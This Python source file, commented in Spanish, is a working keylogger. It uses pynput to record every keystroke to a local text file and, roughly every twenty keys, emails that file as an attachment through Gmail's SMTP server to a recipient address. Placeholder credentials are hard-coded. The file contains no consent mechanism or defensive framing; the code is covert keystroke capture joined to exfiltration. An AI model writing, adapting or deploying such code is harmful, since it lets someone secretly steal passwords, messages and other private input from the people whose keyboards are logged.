import pynput
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Contador para enviar el email cada 20 teclas
counter_mail = 0

def send_mail():
    try:
        remitente = 'user@gmail.com'
        destinatarios = ['destination@gmail.com']
        asunto = '[RPI] Registro de teclas'
        cuerpo = 'Adjunto el registro de teclas capturado.'
        filename = 'text.txt'  # Nombre del archivo

        # Crear el objeto mensaje
        mail = MIMEMultipart()
        mail['From'] = remitente
        mail['To'] = ", ".join(destinatarios)
        mail['Subject'] = asunto
        mail.attach(MIMEText(cuerpo, 'plain'))

        # Adjuntar el archivo
        with open(filename, 'rb') as file:
            adjunto_MIME = MIMEBase('application', 'octet-stream')
            adjunto_MIME.set_payload(file.read())
            encoders.encode_base64(adjunto_MIME)
            adjunto_MIME.add_header('Content-Disposition', f'attachment; filename={filename}')
            mail.attach(adjunto_MIME)

        # Enviar el correo
        sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
        sesion_smtp.starttls()

        # Usa una contraseña de aplicación en lugar de la tuya
        sesion_smtp.login('user@gmail.com', 'password')
        sesion_smtp.sendmail(remitente, destinatarios, mail.as_string())
        sesion_smtp.quit()
        
        print("Email enviado con éxito.")

    except Exception as e:
        print(f"Error enviando el correo: {e}")

def on_press(key):
    global counter_mail  # Permitir modificar la variable global

    print(str(key))
    with open("text.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.enter:
                logKey.write("\n")
            else:
                char = key.char
                logKey.write(char)

            # Enviar email cada 20 teclas registradas
            if counter_mail == 20:
                send_mail()
                counter_mail = 0  # Reiniciar contador después de enviar el email
            else:
                counter_mail += 1

            print(f"Teclas registradas: {counter_mail}")

        except AttributeError:  # Para teclas como Shift, Ctrl, Enter, etc.
            logKey.write(f'[{key}]')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    listener.join()
